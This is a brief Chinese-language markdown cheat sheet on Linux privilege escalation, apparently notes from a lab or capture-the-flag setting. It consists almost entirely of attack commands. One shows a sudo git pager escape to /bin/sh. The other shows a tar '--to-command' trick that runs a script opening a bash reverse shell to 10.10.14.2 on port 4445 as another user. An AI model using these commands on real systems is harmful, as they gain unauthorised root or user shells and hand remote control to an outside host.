# Linux提权

### git提权

```
sudo git -p help config
# 末行模式下书写
!/bin/sh
```

### tar提权

```
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.2/4445 0>&1' > xxx.sh
tar -cvf xxx.tar xxx.sh
sudo  -u onuma tar -xvf xxx.tar --to-command /bin/bash
```





